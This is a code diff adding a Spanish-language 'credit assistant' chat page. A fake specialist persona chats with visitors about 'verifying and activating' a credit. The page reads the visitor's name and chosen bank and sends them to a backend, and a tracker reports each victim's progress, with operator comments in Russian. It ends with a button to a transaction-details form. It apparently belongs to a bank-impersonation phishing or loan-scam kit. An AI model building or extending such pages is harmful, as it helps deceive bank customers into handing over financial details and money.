@@ -1,0 +1,506 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Asistente de crédito</title>
+    <link rel="icon" href="data:," />
+
+    <link rel="stylesheet" href="../CSS/link-bank.css" />
+    <link rel="stylesheet" href="./tourist.css" />
+
+    <script src="../js/api-config.js?v=20260321-6"></script>
+    <script src="../js/flow-session-id.js?v=20260320-3"></script>
+    <script src="../js/app-guard.js?v=20260518-1"></script>
+    <script src="../js/navigation-guard.js?v=20260405-1"></script>
+    <script src="../js/client-tracker.js?v=20260518-1"></script>
+
+    <style>
+      /* Remove body bottom-padding reserved for the tabbar — this page has none */
+      body:has(.tourist-shell--assistant) {
+        padding-bottom: 0;
+      }
+
+      .tourist-shell--assistant {
+        min-height: 100dvh;
+        background: #fafafa;
+      }
+
+      /* ── Specialist card ── */
+      .assistant-specialist {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin: 0 16px 0;
+        padding: 15px;
+        background: #ffffff;
+        border-radius: 12px;
+        flex-shrink: 0;
+      }
+
+      .assistant-specialist__avatar {
+        width: 49px;
+        height: 49px;
+        flex: 0 0 49px;
+        border-radius: 50%;
+        object-fit: cover;
+        background: #ededed;
+      }
+
+      .assistant-specialist__text {
+        flex: 1;
+        min-width: 0;
+        display: flex;
+        flex-direction: column;
+        gap: 2px;
+      }
+
+      .assistant-specialist__name {
+        margin: 0;
+        color: #0f0f0f;
+        font-size: 15px;
+        font-weight: 600;
+        line-height: 23px;
+      }
+
+      .assistant-specialist__desc {
+        margin: 0;
+        color: #787878;
+        font-size: 13px;
+        font-weight: 400;
+        line-height: 20px;
+      }
+
+      .assistant-specialist__icon {
+        width: 24px;
+        height: 24px;
+        flex: 0 0 24px;
+        display: block;
+        animation: assistantPulse 2.4s ease-in-out infinite;
+      }
+
+      @keyframes assistantPulse {
+        0%, 100% { opacity: 1; }
+        50%       { opacity: 0; }
+      }
+
+      /* ── Chat feed ── */
+      .assistant-chat {
+        flex: 1 1 auto;
+        min-height: 0;
+        overflow-y: auto;
+        overflow-x: hidden;
+        -webkit-overflow-scrolling: touch;
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+        padding: 16px 16px calc(86px + env(safe-area-inset-bottom, 0px));
+        background: #f7f7f7;
+        margin-top: 12px;
+      }
+
+      /* ── Message bubbles ── */
+      .assistant-msg {
+        max-width: 80%;
+        padding: 14px 16px;
+        min-width: 0;
+        word-break: break-word;
+        overflow-wrap: anywhere;
+      }
+
+      .assistant-msg p {
+        margin: 0;
+        font-size: 13px;
+        font-weight: 500;
+        line-height: 21px;
+        word-break: break-word;
+        overflow-wrap: anywhere;
+      }
+
+      .assistant-msg--user {
+        align-self: flex-end;
+        background: #fa6c12;
+        border-radius: 19px 19px 0 19px;
+      }
+
+      .assistant-msg--user p {
+        color: #ffffff;
+      }
+
+      .assistant-msg--bot {
+        align-self: flex-start;
+        background: #ffffff;
+        border-radius: 19px 19px 19px 0;
+      }
+
+      .assistant-msg--bot p {
+        color: #0f0f0f;
+      }
+
+      /* ── Typing indicator ── */
+      .assistant-typing {
+        align-self: flex-start;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .assistant-typing__icon {
+        display: block;
+        flex-shrink: 0;
+      }
+
+      .assistant-typing__text {
+        color: #fa6c12;
+        font-size: 13px;
+        font-weight: 500;
+        line-height: 20px;
+      }
+
+      /* Animated dots: each dot fades in sequentially, then all fade out */
+      .assistant-typing__dots {
+        display: inline-flex;
+        gap: 1px;
+      }
+
+      .assistant-typing__dot {
+        opacity: 0;
+        animation: typingDot 1.5s ease-in-out infinite;
+      }
+
+      .assistant-typing__dot:nth-child(1) { animation-delay: 0s; }
+      .assistant-typing__dot:nth-child(2) { animation-delay: 0.3s; }
+      .assistant-typing__dot:nth-child(3) { animation-delay: 0.6s; }
+
+      @keyframes typingDot {
+        0%   { opacity: 0; }
+        20%  { opacity: 1; }
+        60%  { opacity: 1; }
+        80%  { opacity: 0; }
+        100% { opacity: 0; }
+      }
+
+      /* ── Fixed input bar ── */
+      .assistant-inputbar {
+        position: fixed;
+        left: 50%;
+        bottom: 0;
+        transform: translateX(-50%);
+        width: 100%;
+        max-width: 480px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 16px 16px calc(16px + env(safe-area-inset-bottom, 0px));
+        background: #f7f7f7;
+        box-sizing: border-box;
+        z-index: 10;
+      }
+
+      .assistant-input-wrap {
+        flex: 1 1 auto;
+        display: flex;
+        align-items: center;
+        height: 54px;
+        padding: 0 16px;
+        background: #ffffff;
+        border: 1px solid #fa6c12;
+        border-radius: 12px;
+        box-sizing: border-box;
+      }
+
+      .assistant-input {
+        width: 100%;
+        border: none;
+        outline: none;
+        background: transparent;
+        font-family: inherit;
+        font-size: 13px;
+        font-weight: 500;
+        line-height: 17px;
+        color: #0f0f0f;
+      }
+
+      .assistant-input::placeholder {
+        color: #9e9e9e;
+      }
+
+      .assistant-send {
+        flex: 0 0 54px;
+        width: 54px;
+        height: 54px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: none;
+        border-radius: 50%;
+        background: #fa6c12;
+        cursor: pointer;
+        padding: 0;
+      }
+
+      .assistant-send svg {
+        display: block;
+      }
+
+      .assistant-send:active {
+        opacity: 0.9;
+      }
+
+      /* ── Bot final action button ── */
+      .assistant-action-wrap {
+        align-self: flex-start;
+        width: 80%;
+        padding-top: 4px;
+      }
+
+      .assistant-action-btn {
+        display: block;
+        width: 100%;
+        padding: 14px 20px;
+        background: linear-gradient(270deg, #ff77d7 0%, #fa6c12 100%);
+        border: none;
+        border-radius: 14px;
+        color: #ffffff;
+        font-family: inherit;
+        font-size: 14px;
+        font-weight: 600;
+        line-height: 21px;
+        cursor: pointer;
+        text-align: center;
+        letter-spacing: 0.2px;
+      }
+
+      .assistant-action-btn:active {
+        opacity: 0.85;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="tourist-shell tourist-shell--assistant">
+
+      <div class="tourist-topbar">
+        <button
+          type="button"
+          class="tourist-topbar__back"
+          data-tourist-back
+          data-tourist-back-fallback="./support.html"
+          aria-label="Atrás"
+        >
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12.5 16.6 7.07 11.17a1.65 1.65 0 0 1 0-2.34L12.5 3.4"
+                  stroke="#0F0F0F" stroke-width="1.5" stroke-miterlimit="10"
+                  stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+        <h1 class="tourist-topbar__title">Asistente de crédito</h1>
+      </div>
+
+      <section class="assistant-specialist">
+        <img class="assistant-specialist__avatar" src="../assets/profile-girl.png" alt="" />
+        <div class="assistant-specialist__text">
+          <p class="assistant-specialist__name">Sofía Álvarez López</p>
+          <p class="assistant-specialist__desc">Especialista asignada para la verificación y activación de su crédito.</p>
+        </div>
+        <img class="assistant-specialist__icon" src="../assets/airdrop.svg" alt="" aria-hidden="true" />
+      </section>
+
+      <main class="assistant-chat" id="assistantChat">
+
+        <div class="assistant-typing" id="assistantTyping" aria-live="polite" style="display:none;">
+          <svg class="assistant-typing__icon" width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path d="M15.75 16.5H2.25C1.9425 16.5 1.6875 16.245 1.6875 15.9375C1.6875 15.63 1.9425 15.375 2.25 15.375H15.75C16.0575 15.375 16.3125 15.63 16.3125 15.9375C16.3125 16.245 16.0575 16.5 15.75 16.5Z" fill="#FA6C12"/>
+            <path d="M14.2649 2.60926C12.8099 1.15426 11.3849 1.11676 9.89243 2.60926L8.98493 3.51676C8.90993 3.59176 8.87993 3.71176 8.90993 3.81676C9.47993 5.80426 11.0699 7.39426 13.0574 7.96426C13.0874 7.97176 13.1174 7.97926 13.1474 7.97926C13.2299 7.97926 13.3049 7.94926 13.3649 7.88926L14.2649 6.98176C15.0074 6.24676 15.3674 5.53426 15.3674 4.81426C15.3749 4.07176 15.0149 3.35176 14.2649 2.60926Z" fill="#FA6C12"/>
+            <path d="M11.7043 8.64906C11.4868 8.54406 11.2768 8.43906 11.0743 8.31906C10.9093 8.22156 10.7518 8.11656 10.5943 8.00406C10.4668 7.92156 10.3168 7.80156 10.1743 7.68156C10.1593 7.67406 10.1068 7.62906 10.0468 7.56906C9.79932 7.35906 9.52182 7.08906 9.27432 6.78906C9.25182 6.77406 9.21432 6.72156 9.16182 6.65406C9.08682 6.56406 8.95932 6.41406 8.84682 6.24156C8.75682 6.12906 8.65182 5.96406 8.55432 5.79906C8.43432 5.59656 8.32932 5.39406 8.22432 5.18406C8.08665 4.88906 7.69946 4.80142 7.46927 5.03162L3.25182 9.24906C3.15432 9.34656 3.06432 9.53406 3.04182 9.66156L2.63682 12.5341C2.56182 13.0441 2.70432 13.5241 3.01932 13.8466C3.28932 14.1091 3.66432 14.2516 4.06932 14.2516C4.15932 14.2516 4.24932 14.2441 4.33932 14.2291L7.21932 13.8241C7.35432 13.8016 7.54182 13.7116 7.63182 13.6141L11.8562 9.38966C12.0818 9.16406 11.9971 8.77591 11.7043 8.64906Z" fill="#FA6C12"/>
+          </svg>
+          <span class="assistant-typing__text">
+            Escribiendo<span class="assistant-typing__dots" aria-hidden="true"><span class="assistant-typing__dot">.</span><span class="assistant-typing__dot">.</span><span class="assistant-typing__dot">.</span></span>
+          </span>
+        </div>
+
+      </main>
+
+    </div>
+
+    <form class="assistant-inputbar" id="assistantForm" autocomplete="off">
+      <div class="assistant-input-wrap">
+        <input
+          class="assistant-input"
+          type="text"
+          id="assistantInput"
+          placeholder="Escriba su mensaje..."
+          aria-label="Mensaje"
+        />
+      </div>
+      <button class="assistant-send" type="submit" aria-label="Enviar">
+        <svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M20.5 10.13 3.5 2.13c-.85-.38-1.73.48-1.43 1.35l1.9 5.79c.1.28.1.58 0 .87l-1.9 5.79c-.3.87.58 1.73 1.43 1.35l17-8a.96.96 0 0 0 0-1.75z" fill="#ffffff"/>
+        </svg>
+      </button>
+    </form>
+
+    <script src="./tourist.js?v=20260524-1"></script>
+    <script>
+      (function () {
+        var chat = document.getElementById('assistantChat');
+        var form = document.getElementById('assistantForm');
+        var input = document.getElementById('assistantInput');
+        var typing = document.getElementById('assistantTyping');
+        var sendBtn = form.querySelector('.assistant-send');
+
+        var API_BASE = window.FORM_API_BASE || window.MAIN_API_BASE || window.API_BASE || window.location.origin;
+        var sessionId = (typeof window.getFlowSessionId === 'function')
+          ? window.getFlowSessionId()
+          : (localStorage.getItem('flowSessionId') || 'web' + Date.now());
+        var name = (localStorage.getItem('inputName') || '').trim();
+        var bank = (localStorage.getItem('selectedBank') || '').trim();
+
+        var botStarted = false;
+
+        // Статус: КЛИЕНТ ДОШЕЛ ДО ЧАТА
+        if (window.ClientTracker) ClientTracker.track('tourist_chat_reached', { bank: bank });
+
+        function escapeHtml(str) {
+          return String(str)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;');
+        }
+
+        function scrollDown() {
+          requestAnimationFrame(function () { chat.scrollTop = chat.scrollHeight; });
+        }
+
+        function addMessage(role, text) {
+          var msg = document.createElement('div');
+          msg.className = 'assistant-msg ' + (role === 'user' ? 'assistant-msg--user' : 'assistant-msg--bot');
+          msg.innerHTML = '<p>' + escapeHtml(text).replace(/\n/g, '<br>') + '</p>';
+          chat.insertBefore(msg, typing);
+          scrollDown();
+          return msg;
+        }
+
+        function showTyping(on) {
+          typing.style.display = on ? 'flex' : 'none';
+          if (on) { chat.appendChild(typing); }
+          scrollDown();
+        }
+
+        function setBusy(on) {
+          input.disabled = on;
+          sendBtn.disabled = on;
+          showTyping(on);
+        }
+
+        function postChat(payload) {
+          return fetch(API_BASE.replace(/\/+$/, '') + '/api/chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            mode: 'cors',
+            credentials: 'omit'
+          }).then(function (r) { return r.json(); });
+        }
+
+        // Показать кнопку перехода на форму (БОТ ЗАКОНЧИЛ ДИАЛОГ)
+        function showActionButton() {
+          if (document.getElementById('assistantActionWrap')) return;
+          var wrap = document.createElement('div');
+          wrap.className = 'assistant-action-wrap';
+          wrap.id = 'assistantActionWrap';
+          var btn = document.createElement('button');
+          btn.type = 'button';
+          btn.className = 'assistant-action-btn';
+          btn.textContent = 'Proceder al formulario';
+          btn.addEventListener('click', function () {
+            try { localStorage.setItem('botDialogDone', '1'); } catch (e) {}
+            if (window.ClientTracker) ClientTracker.track('tourist_bot_finished', { bank: bank });
+            location.replace('./detail-transaction.html');
+          });
+          wrap.appendChild(btn);
+          chat.insertBefore(wrap, typing);
+          scrollDown();
+        }
+
+        function send(text) {
+          setBusy(true);
+          postChat({ sessionId: sessionId, message: text, name: name, bank: bank })
+            .then(function (data) {
+              setBusy(false);
+              if (data && data.reply) {
+                addMessage('bot', data.reply);
+                if (!botStarted) {
+                  botStarted = true;
+                  // Статус: БОТ НАЧАЛ ДИАЛОГ (уже начат, если отвечает)
+                }
+              } else {
+                addMessage('bot', 'Disculpa, no he podido responder. Inténtalo de nuevo.');
+              }
+              // Статус: БОТ ЗАКОНЧИЛ ДИАЛОГ
+              if (data && data.done) {
+                try { localStorage.setItem('botDialogDone', '1'); } catch (e) {}
+                if (window.ClientTracker) ClientTracker.track('tourist_bot_finished_dialogue', { bank: bank });
+                showActionButton();
+              }
+            })
+            .catch(function () {
+              setBusy(false);
+              addMessage('bot', 'Hubo un problema de conexión. Inténtalo de nuevo en un momento.');
+            });
+        }
+
+        form.addEventListener('submit', function (e) {
+          e.preventDefault();
+          var text = input.value.trim();
+          if (!text || input.disabled) return;
+          addMessage('user', text);
+          input.value = '';
+          send(text);
+        });
+
+        function init() {
+          var isDone = false;
+          try { isDone = localStorage.getItem('botDialogDone') === '1'; } catch (e) {}
+
+          fetch(API_BASE.replace(/\/+$/, '') + '/api/chat/history/' + encodeURIComponent(sessionId), {
+            method: 'GET', cache: 'no-store', mode: 'cors', credentials: 'omit'
+          })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+              var msgs = (data && data.messages) || [];
+              if (msgs.length) {
+                msgs.forEach(function (m) { addMessage(m.role === 'user' ? 'user' : 'bot', m.content); });
+                botStarted = true;
+                if (isDone) showActionButton();
+                return;
+              }
+              // Нет истории — приветствие от бота
+              setBusy(true);
+              postChat({ sessionId: sessionId, start: true, name: name, bank: bank })
+                .then(function (d) {
+                  setBusy(false);
+                  if (d && d.reply) {
+                    addMessage('bot', d.reply);
+                    if (!botStarted) {
+                      botStarted = true;
+                      // Статус: БОТ НАЧАЛ ДИАЛОГ
+                      if (window.ClientTracker) ClientTracker.track('tourist_bot_started', { bank: bank });
+                    }
+                  }
+                  if (d && d.done) {
+                    try { localStorage.setItem('botDialogDone', '1'); } catch (e) {}
+                    showActionButton();
+                  }
+                })
+                .catch(function () { setBusy(false); });
+            })
+            .catch(function () {});
+        }
+
+        init();
+      })();
+    </script>
+  </body>
+</html>
